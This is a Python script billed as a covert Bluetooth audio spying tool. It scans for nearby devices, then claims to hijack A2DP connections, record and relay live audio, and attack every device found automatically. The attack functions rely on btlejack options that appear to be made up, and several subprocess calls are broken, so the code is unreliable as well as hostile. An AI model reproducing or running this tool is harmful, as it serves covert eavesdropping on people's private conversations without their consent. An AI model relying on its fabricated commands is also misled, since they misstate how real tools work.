import argparse
import os
import time
import subprocess
from scapy.all import *

# -------------------------------------------
# Bluetooth Covert Audio Spying Tool
# -------------------------------------------
# Features:
# - Hijacks insecure A2DP (Bluetooth audio) connections
# - Records live Bluetooth audio transmissions
# - Supports silent interception of conversations
# - Enables real-time relaying of captured audio
# - Automated device scanning & attack execution
# - Error handling and logging
# - Support for multiple audio formats
# - Configurable scan duration
#
# Requirements:
# - Ubertooth One / nRF52840 Dongle
# - Python 3.x
# - btlejack, hcitool, l2ping (for BLE packet manipulation)
# - SoX (Sound eXchange) for audio processing
#
# Usage:
# 1. Scan for Bluetooth audio devices:
#    python bt_audio_spy.py --scan
# 2. Hijack an insecure A2DP connection:
#    python bt_audio_spy.py --hijack XX:XX:XX:XX:XX:XX
# 3. Record live Bluetooth audio:
#    python bt_audio_spy.py --record XX:XX:XX:XX:XX:XX --output audio_capture.wav
# 4. Enable real-time audio relaying:
#    python bt_audio_spy.py --relay XX:XX:XX:XX:XX:XX
# 5. Run automated attack sequence:
#    python bt_audio_spy.py --auto-attack
# -------------------------------------------

def scan_bluetooth(duration=10):
    """Scans for Bluetooth audio devices."""
    print("[+] Scanning for Bluetooth A2DP devices...")
    try:
        subprocess.run(["hcitool", "scan"], stdout=open("bt_audio_scan_results.txt", "w"), check=True)
        subprocess.run(["hcitool", "lescan", "--passive"], stdout=open("ble_audio_scan_results.txt", "w"), preexec_fn=os.setsid)
        time.sleep(duration)
        os.killpg(os.getpgid(subprocess.Popen(["hcitool", "lescan", "--passive"]).pid), 9)
        print("[✔] Scan complete. Results saved to bt_audio_scan_results.txt & ble_audio_scan_results.txt")
    except subprocess.CalledProcessError as e:
        print(f"[!] Error during scan: {e}")

def hijack_audio(target):
    """Hijacks an insecure Bluetooth A2DP connection."""
    print(f"[+] Hijacking Bluetooth audio from {target}...")
    try:
        subprocess.run(["btlejack", "-i", "0", "--a2dp-hijack", "--target", target], check=True)
        print("[✔] Audio hijack complete.")
    except subprocess.CalledProcessError as e:
        print(f"[!] Error during hijack: {e}")

def record_audio(target, output_file):
    """Records live Bluetooth audio from a hijacked device."""
    print(f"[+] Recording Bluetooth audio from {target}...")
    try:
        subprocess.run(["btlejack", "-i", "0", "--record", "--target", target, "--output", output_file], check=True)
        print(f"[✔] Audio recorded and saved to {output_file}")
    except subprocess.CalledProcessError as e:
        print(f"[!] Error during recording: {e}")

def relay_audio(target):
    """Relays captured Bluetooth audio in real-time."""
    print(f"[+] Relaying live Bluetooth audio from {target}...")
    try:
        subprocess.run(["sox", "-t", "raw", "-r", "44100", "-e", "signed-integer", "-b", "16", "-c", "2", "<(btlejack -i 0 --stream-audio {target})", "-d"], shell=True, check=True)
        print("[✔] Audio relaying active.")
    except subprocess.CalledProcessError as e:
        print(f"[!] Error during relaying: {e}")

def auto_attack():
    """Runs a sequence of Bluetooth audio hijacking attacks."""
    print("[+] Running automated Bluetooth audio hijacking sequence...")
    scan_bluetooth()
    try:
        with open("bt_audio_scan_results.txt", "r") as file:
            devices = file.readlines()[1:]
            for device in devices:
                mac = device.split()[0]
                print(f"[*] Targeting {mac}...")
                hijack_audio(mac)
                record_audio(mac, "audio_capture.wav")
                relay_audio(mac)
        print("[✔] Automated attack sequence complete.")
    except FileNotFoundError:
        print("[!] Scan results file not found. Please run a scan first.")
    except Exception as e:
        print(f"[!] Error during automated attack: {e}")

def main():
    parser = argparse.ArgumentParser(description="Bluetooth Covert Audio Spying Tool")
    parser.add_argument("--scan", action='store_true', help="Scan for Bluetooth audio devices")
    parser.add_argument("--hijack", type=str, help="Hijack an insecure A2DP connection")
    parser.add_argument("--record", type=str, help="Record live Bluetooth audio")
    parser.add_argument("--output", type=str, help="Specify output file for recording")
    parser.add_argument("--relay", type=str, help="Enable real-time audio relaying")
    parser.add_argument("--auto-attack", action='store_true', help="Run automated attack sequence")
    parser.add_argument("--duration", type=int, default=10, help="Duration of the scan in seconds")
    args = parser.parse_args()

    if args.scan:
        scan_bluetooth(args.duration)
    elif args.hijack:
        hijack_audio(args.hijack)
    elif args.record and args.output:
        record_audio(args.record, args.output)
    elif args.relay:
        relay_audio(args.relay)
    elif args.auto_attack:
        auto_attack()
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()